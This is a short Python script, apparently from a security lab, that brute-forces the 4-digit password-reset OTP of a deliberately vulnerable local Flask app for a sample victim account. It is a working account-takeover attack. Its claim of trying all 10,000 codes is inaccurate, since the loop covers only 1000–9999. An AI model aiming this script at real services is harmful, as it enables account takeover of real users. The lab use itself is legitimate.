"""
Brute-force script that demonstrates the OTP weakness in vulnerable/app.py.

This script tries all 10,000 possible 4-digit OTPs against a target account.
On a local machine it completes in a few seconds.

Run AFTER starting vulnerable/app.py:
    python brute_force.py
"""

import requests

TARGET_EMAIL = "victim@example.com"
BASE_URL = "http://127.0.0.1:5000"

# Step 1: Trigger OTP generation for the target account
print(f"[*] Requesting password reset for {TARGET_EMAIL}...")
r = requests.post(f"{BASE_URL}/request-reset", json={"email": TARGET_EMAIL})
print(f"    Server response: {r.json()}")

# Step 2: Brute-force all 4-digit OTPs (1000–9999)
print("[*] Starting brute-force (10,000 guesses)...")
for otp in range(1000, 10000):
    candidate = str(otp)
    response = requests.post(
        f"{BASE_URL}/verify-otp",
        json={"email": TARGET_EMAIL, "otp": candidate}
    )
    if response.status_code == 200:
        print(f"[+] SUCCESS! OTP found: {candidate}")
        print(f"    Server response: {response.json()}")
        break
    if otp % 1000 == 0:
        print(f"    Tried {otp - 1000} so far...")
else:
    print("[-] OTP not found in range 1000–9999")
